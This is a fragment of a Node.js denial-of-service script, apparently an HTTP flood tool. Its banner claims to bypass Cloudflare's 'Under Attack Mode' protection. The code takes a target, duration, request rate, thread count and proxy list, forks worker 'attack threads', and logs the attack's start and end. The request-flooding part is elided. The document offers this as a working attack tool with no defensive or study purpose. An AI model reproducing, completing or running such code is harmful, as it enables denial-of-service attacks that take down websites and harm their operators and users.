//npm i net http2 tls cluster url crypto user-agents fs header-generator fake-useragent
 ...
 if (process.argv.length < 7){console.log(`node BROWSER target time rate(32) thread proxy.txt`); process.exit();}
 const headers = {};
...
if (cluster.isMaster){
  console.clear();
  console.log(`
UAM & HTTPDDOS BYPASS MADE BY BASSINGS
                                        
`);
  
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`[\x1b[35mBROWSER\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
  }
  console.log(`[\x1b[35mBROWSER\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`[\x1b[35mBROWSER\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
